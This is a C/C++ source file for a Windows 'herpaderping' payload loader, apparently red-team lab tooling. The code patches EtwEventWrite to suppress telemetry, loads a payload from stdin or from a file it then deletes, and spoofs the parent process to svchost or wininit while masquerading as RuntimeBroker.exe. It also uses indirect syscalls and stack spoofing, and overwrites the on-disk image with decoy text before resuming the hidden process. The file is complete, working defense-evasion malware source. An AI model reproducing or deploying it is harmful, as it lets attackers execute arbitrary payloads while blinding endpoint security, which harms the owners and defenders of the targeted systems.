#include <Windows.h>

#include <stdio.h>

#include <tlhelp32.h>

#include "CWLInc.h"

#include "StackSpoof.h"

#include "obfstr.h"

#include "api_hash.h"

#include "syscall.h"



#ifdef CWLDEBUG
#define DBG_PRINT(fmt, ...) printf("[DBG] " fmt "\n", ##__VA_ARGS__)
#else
#define DBG_PRINT(fmt, ...) ((void)0)
#endif



// Default payload path - can be overridden at compile time

// Usage: msbuild ... /p:PreprocessorDefinitions="PAYLOAD_PATH=L\"D:\\custom\\path.exe\""

#ifndef PAYLOAD_PATH

#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"

#endif



#ifdef ENABLE_ETW_PATCH
// B1 — ETW Patch (T1562.006): patch ntdll!EtwEventWrite → xor eax,eax; ret

// Suppresses ETW events for NtCreateSection / NtCreateProcessEx / NtWriteVirtualMemory

// Must be called before any NT API invocation to prevent DC0021 telemetry

static void PatchEtw()

{

	HMODULE hNtdll = GetNtdllBase();

	PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);

	if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }

	DBG_PRINT("PatchEtw: EtwEventWrite resolved at %p", pEtw);

	DWORD old = 0;

	VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);

	memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret

	VirtualProtect(pEtw, 4, old, &old);

	DBG_PRINT("PatchEtw: EtwEventWrite patched (xor eax,eax; ret)");

}
#endif  // ENABLE_ETW_PATCH



static HANDLE GetNonJobParent()

{

	const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();

	PROCESSENTRY32W pe = { sizeof(pe) };

	if (Process32FirstW(hSnap, &pe)) {

		do {

			for (int i = 0; targets[i]; i++) {

				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {

					DWORD sid = 0xFFFF;

					ProcessIdToSessionId(pe.th32ProcessID, &sid);

					if (sid != 0) continue;

					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);

					if (h) { DBG_PRINT("GetNonJobParent: using %ls (PID=%lu)", pe.szExeFile, pe.th32ProcessID); CloseHandle(hSnap); return h; }

				}

			}

		} while (Process32NextW(hSnap, &pe));

	}

	CloseHandle(hSnap);

	DBG_PRINT("GetNonJobParent: no suitable parent found, using self");

	return GetCurrentProcess();

}



// GetPayloadBuffer: supports two modes for T1620 Reflective Code Loading

// Mode 1 (STDIN): read payload from stdin with 4-byte size header (NO disk artifact)

//   - Detection: node.exe spawns CertEnrollAgent.exe with stdin redirection

//   - Flow: stdin → VirtualAlloc → ReadFile(stdin) → Herpaderping

// Mode 2 (FILE): fallback to legacy file-based loading (for testing)

//   - Detection: CreateFileW → ReadFile → DeleteFileW (T1070.004)

BYTE *GetPayloadBuffer(OUT size_t &p_size)

{

	HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);

	DWORD stdinType = GetFileType(hStdin);

	

	// Mode 1: STDIN redirection (T1620 - Reflective Code Loading)

	// Check if stdin is redirected (FILE type instead of CHAR device)

	if (hStdin != INVALID_HANDLE_VALUE && stdinType == FILE_TYPE_PIPE)

	{

		// Read 4-byte size header (little-endian DWORD)

		DWORD payloadSize = 0;

		DWORD bytesRead = 0;

		if (!ReadFile(hStdin, &payloadSize, sizeof(DWORD), &bytesRead, NULL) || bytesRead != sizeof(DWORD))

		{

			perror("[-] Failed to read payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: payload size from stdin = %lu bytes", payloadSize);

		// Validate size (sanity check: 1KB - 50MB range)

		if (payloadSize < 1024 || payloadSize > 50 * 1024 * 1024)

		{

			perror("[-] Invalid payload size from stdin\n");

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin pipe detected");

		// Allocate RW buffer for payload

		BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (bufferAddress == NULL)

		{

			perror("[-] Failed to allocate memory for stdin payload buffer\n");

			exit(-1);

		}

		

		// Read payload bytes from stdin

		bytesRead = 0;

		if (!ReadFile(hStdin, bufferAddress, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize)

		{

			perror("[-] Failed to read payload from stdin\n");

			VirtualFree(bufferAddress, 0, MEM_RELEASE);

			exit(-1);

		}

		

		DBG_PRINT("GetPayloadBuffer: stdin payload read OK (%lu bytes)", bytesRead);

		p_size = payloadSize;

		// NO DeleteFileW — payload never touched disk (T1620)

		return bufferAddress;

	}

	

	// Mode 2: FILE-based loading (legacy fallback)

	// Used for testing or when stdin not available

	DBG_PRINT("GetPayloadBuffer: file mode, loading from disk");

	HANDLE hFile = CreateFileW(PAYLOAD_PATH, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)

	{

		perror("[-] Failed to open payload file (no stdin and no file found)\n");

		return NULL;

	}

	p_size = GetFileSize(hFile, NULL);

	BYTE *bufferAddress = (BYTE *)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (bufferAddress == NULL)

	{

		perror("[-] Failed to allocate memory for payload buffer\n");

		exit(-1);

	}

	DWORD bytesRead = 0;

	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL))

	{

		perror("[-] Failed to read payload buffer from file\n");

		exit(-1);

	}

	DBG_PRINT("GetPayloadBuffer: file payload read OK (%zu bytes)", p_size);

	CloseHandle(hFile);

	DeleteFileW(PAYLOAD_PATH);  // T1070.004 - only in file mode

	return bufferAddress;

}



ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE *payload, PROCESS_BASIC_INFORMATION pbi)

{

	// Functions Declaration

	HMODULE hNtdll = GetNtdllBase();

	_RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)RESOLVE_API(hNtdll, RtlImageNtHeader);

	if (pRtlImageNtHeader == NULL)

	{

		perror("[-] Couldn't found API RtlImageNTHeader...\n");

		exit(-1);

	}

	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)RESOLVE_API(hNtdll, NtReadVirtualMemory);

	if (pNtReadVirtualMemory == NULL)

	{

		perror("[-] Couldn't found API NtReadVirtualMemory...\n");

		exit(-1);

	}

	// Retrieving entrypoint of our payload

	BYTE image[0x1000];

	ULONG_PTR entryPoint;

	SIZE_T bytesRead;

	NTSTATUS status;

	ZeroMemory(image, sizeof(image));

	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &image, sizeof(image), &bytesRead);

	if (!NT_SUCCESS(status))

	{

		perror("[-] Error reading process base address..\n");

		exit(-1);

	}

	entryPoint = (pRtlImageNtHeader(payload)->OptionalHeader.AddressOfEntryPoint);

	entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;

	return entryPoint;

}



BOOL Herpaderping(BYTE *payload, size_t payloadSize)
{
	HMODULE hNtdll = GetNtdllBase();

	if (!InitSyscallPool(hNtdll))
	{
		perror("[-] Failed to initialize indirect syscall pool\n");
		exit(-1);
	}
	DBG_PRINT("Herpaderping: indirect syscall pool initialized");
	INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
	SealSyscallPool();

	if (pNtCreateUserProcess == NULL)
	{
		perror("[-] Couldn't resolve SSN for NtCreateUserProcess\n");
		exit(-1);
	}

	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)RESOLVE_API(hNtdll, RtlCreateProcessParametersEx);
	if (pRtlCreateProcessParametersEx == NULL)
	{
		perror("[-] Couldn't find API RtlCreateProcessParametersEx\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)RESOLVE_API(hNtdll, RtlInitUnicodeString);
	if (pRtlInitUnicodeString == NULL)
	{
		perror("[-] Couldn't find API RtlInitUnicodeString\n");
		exit(-1);
	}

	HANDLE hTemp;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	NTSTATUS status;
	DWORD bytesWritten;

	// Create temp file and write payload
	wchar_t tempFile[MAX_PATH] = {0};
	wchar_t tempPath[MAX_PATH] = {0};
	GetTempPathW(MAX_PATH, tempPath);
	GetTempFileNameW(tempPath, L"HD", 0, tempFile);

	hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
						FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (hTemp == INVALID_HANDLE_VALUE)
	{
		perror("[-] Unable to create temp file....\n");
		exit(-1);
	}
	if (!WriteFile(hTemp, payload, payloadSize, &bytesWritten, NULL))
	{
		perror("[-] Unable to write payload to the file...\n");
		exit(-1);
	}
	FlushFileBuffers(hTemp);
	CloseHandle(hTemp);
	DBG_PRINT("Herpaderping: temp file created and payload written: %ls (%lu bytes)", tempFile, bytesWritten);

	// Build NT path for NtCreateUserProcess
	wchar_t ntImagePath[MAX_PATH + 8] = {0};
	wsprintfW(ntImagePath, L"\\??\\%s", tempFile);

	// Process parameters — masquerade as RuntimeBroker.exe
	UNICODE_STRING uTargetFilePath;
	wchar_t targetFilePath[MAX_PATH] = {0};
	lstrcpyW(targetFilePath, OBFWSTR(L"C:\\Windows\\System32\\RuntimeBroker.exe"));
	pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);

	UNICODE_STRING uDllPath;
	wchar_t dllDir[MAX_PATH] = {0};
	lstrcpyW(dllDir, OBFWSTR(L"C:\\Windows\\System32"));
	pRtlInitUnicodeString(&uDllPath, dllDir);

	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
										   NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
										   RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: RtlCreateProcessParametersEx failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: process parameters created OK");

	// PS_CREATE_INFO
	PS_CREATE_INFO createInfo;
	memset(&createInfo, 0, sizeof(createInfo));
	createInfo.Size = sizeof(createInfo);
	createInfo.State = PsCreateInitialState;

	// B3 — PPID Spoofing: find svchost.exe/wininit.exe in Session 0
	HANDLE hParent = GetNonJobParent();

	// PS_ATTRIBUTE_LIST — image name + parent process (PPID spoof)
	UNICODE_STRING uNtImagePath;
	pRtlInitUnicodeString(&uNtImagePath, ntImagePath);

	PS_ATTRIBUTE_LIST attrList;
	memset(&attrList, 0, sizeof(attrList));
	attrList.TotalLength = sizeof(SIZE_T) + 2 * sizeof(PS_ATTRIBUTE);
	attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	attrList.Attributes[0].Size = uNtImagePath.Length;
	attrList.Attributes[0].ValuePtr = uNtImagePath.pBuffer;
	attrList.Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	attrList.Attributes[1].Size = sizeof(HANDLE);
	attrList.Attributes[1].Value = (ULONG_PTR)hParent;

	// NtCreateUserProcess — process + initial thread created atomically
	// Thread suspended so we can overwrite the file before execution starts
	{
		StackSpoofer spoofer(OBFSTR("kernel32.dll"));
		spoofer.Activate();
		status = pNtCreateUserProcess(&hProcess, &hThread,
									  PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
									  NULL, NULL,
									  0,
									  THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
									  processParameters,
									  &createInfo,
									  &attrList);
		spoofer.Deactivate();
	}
	if (hParent != GetCurrentProcess()) CloseHandle(hParent);
	if (!NT_SUCCESS(status))
	{
		DBG_PRINT("Herpaderping: NtCreateUserProcess failed (0x%08lx)", status);
		exit(-1);
	}
	DBG_PRINT("Herpaderping: NtCreateUserProcess OK (hProcess=%p, hThread=%p, createInfo.State=%d)", hProcess, hThread, createInfo.State);

	// Overwrite temp file with decoy content (best-effort anti-forensic)
	hTemp = CreateFileW(tempFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
						NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hTemp != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hTemp, 0, 0, FILE_BEGIN);
		signed int bufferSize = 0x1000;
		wchar_t bytesToWrite[] = L"Hello From CyberWarFare Labs\n";
		while (bufferSize > 0)
		{
			WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
			bufferSize -= bytesWritten;
		}
		CloseHandle(hTemp);
		DBG_PRINT("Herpaderping: temp file overwritten with decoy content");
	}
	else
	{
		DBG_PRINT("Herpaderping: temp file overwrite skipped (section lock)");
	}

	// Resume thread — Win32 API (no indirect syscall needed; benign call)
	DWORD prevCount = ResumeThread(hThread);
	if (prevCount == (DWORD)-1)
	{
		DBG_PRINT("Herpaderping: ResumeThread failed (GLE=%lu)", GetLastError());
		exit(-1);
	}
	DBG_PRINT("Herpaderping: ResumeThread OK (prevSuspendCount=%lu), ghost process running", prevCount);

	DeleteFileW(tempFile);
	return TRUE;
}



int main()

{

#ifdef ENABLE_ETW_PATCH
	PatchEtw();
#endif

	DBG_PRINT("main: CWLHerpaderping starting");

	size_t payloadSize;

	BYTE *payloadBuffer = GetPayloadBuffer(payloadSize);

	DBG_PRINT("main: payload loaded (%zu bytes), launching Herpaderping", payloadSize);

	BOOL isSuccess = Herpaderping(payloadBuffer, payloadSize);

	DBG_PRINT("main: Herpaderping returned %d", isSuccess);

}